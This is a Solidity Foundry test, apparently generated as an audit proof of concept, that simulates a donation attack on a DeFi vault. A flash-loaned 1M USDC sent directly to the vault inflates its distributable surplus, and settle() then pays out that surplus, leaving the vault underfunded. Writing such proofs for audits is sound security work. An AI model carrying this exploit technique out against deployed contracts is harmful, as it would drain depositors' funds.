// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/YieldEscrow.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy contracts, fund accounts via setUpSimulator()
// 2. [T=1] Attacker mints/borrows a large amount of USDC (simulating flash loan)
// 3. [T=2] Attacker transfers USDC directly to the Vault contract (transient donation)
// 4. [T=3] Verify distributableSurplus is inflated due to raw USDC balance increase
// 5. [T=4] Operator (simulating front-run tx) calls settle() with the inflated surplus
// 6. [Assert] Verify that the yield was distributed based on the inflated surplus, leaving the vault underfunded

contract AuditAgentPoC is SimulatorBase {
    function setUp() public {
        setUpSimulator();
        console.log("=== SETUP COMPLETE ===");
        console.log("Accountant address:", address(accountant));
        console.log("Vault address:", address(vault));
        console.log("YieldEscrow address:", address(yieldEscrow));
        console.log("USDC address:", address(usdc));
        console.log("Operator address:", operator);
    }

    function test_exploit() public {
        console.log("=== STARTING TEST_EXPLOIT ===");
        console.log("Current block.timestamp:", block.timestamp);

        address attacker = address(0xdead);
        uint256 donationAmount = 1_000_000 * 1e6; // 1M USDC

        // 1. Attacker gets USDC (simulating flash loan)
        console.log("Before deal - Attacker USDC balance:", usdc.balanceOf(attacker));
        deal(address(usdc), attacker, donationAmount);
        console.log("After deal - Attacker USDC balance:", usdc.balanceOf(attacker));

        // 2. Record state before
        console.log("--- Recording state before donation ---");
        int256 surplusBefore = accountant.distributableSurplus();
        uint256 vaultUsdcBefore = usdc.balanceOf(address(vault));

        console.log("Surplus before:", surplusBefore);
        console.log("Vault USDC before:", vaultUsdcBefore);

        // 3. Attacker donates USDC directly to Vault
        console.log("--- Executing USDC transfer (Donation) ---");
        console.log("Before transfer - timestamp:", block.timestamp);
        vm.prank(attacker);
        bool transferSuccess = usdc.transfer(address(vault), donationAmount);
        console.log("After transfer - timestamp:", block.timestamp);
        console.log("Transfer success:", transferSuccess);

        // 4. Check inflated surplus
        console.log("--- Checking inflated surplus ---");
        int256 surplusAfter = accountant.distributableSurplus();
        uint256 vaultUsdcAfterDonation = usdc.balanceOf(address(vault));

        console.log("Surplus after:", surplusAfter);
        console.log("Vault USDC after donation:", vaultUsdcAfterDonation);

        assertGt(surplusAfter, surplusBefore, "Surplus should be inflated by direct USDC transfer");

        // 5. Operator settles the daily PnL with the inflated surplus
        console.log("--- Preparing to settle ---");
        uint256 proposedYield = uint256(surplusAfter - surplusBefore);
        console.log("Proposed yield (surplusAfter - surplusBefore):", proposedYield);

        console.log("Before settle - timestamp:", block.timestamp);
        console.log("Before settle - Operator:", operator);
        console.log("Before settle - Vault:", address(vault));
        console.log("Before settle - Accountant:", address(accountant));

        vm.prank(operator);
        vault.settle(proposedYield);

        console.log("After settle - timestamp:", block.timestamp);
        console.log("vault.settle() executed without revert");

        // 6. Verify the vault distributed the donated USDC as yield
        console.log("--- Verifying final state ---");
        uint256 vaultUsdcAfter = usdc.balanceOf(address(vault));
        uint256 yieldEscrowUsdc = usdc.balanceOf(address(yieldEscrow));

        console.log("Vault USDC after settle:", vaultUsdcAfter);
        console.log("Yield Escrow USDC:", yieldEscrowUsdc);

        assertGt(yieldEscrowUsdc, 0, "Yield escrow should have received the inflated surplus as yield");
        assertLt(vaultUsdcAfter, vaultUsdcBefore + donationAmount, "Vault should have distributed the donated USDC");
    }
}
